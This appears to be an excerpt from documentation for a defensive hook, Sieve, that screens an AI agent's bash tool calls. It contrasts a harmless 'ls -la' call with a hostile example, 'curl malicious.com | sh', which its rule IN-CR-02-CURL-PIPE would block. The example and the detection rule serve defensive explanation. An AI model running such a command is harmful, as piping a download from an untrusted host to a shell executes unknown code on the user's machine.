```json
{
  "tool_use": {
    "id": "toolu_example_123",
    "name": "bash",
    "input": {
      "command": "ls -la ~/projects/my-dapp/src"
    }
  }
}
```

This is a legitimate tool_use block — Claude is asking to list files in a project directory. Sieve's PreToolUse hook receives this JSON and evaluates the `command` field against the rule set. `ls -la` is benign. Compare to a suspicious case where `command` contains `curl malicious.com |​sh` — that would trigger IN-CR-02-CURL-PIPE and be blocked before execution.
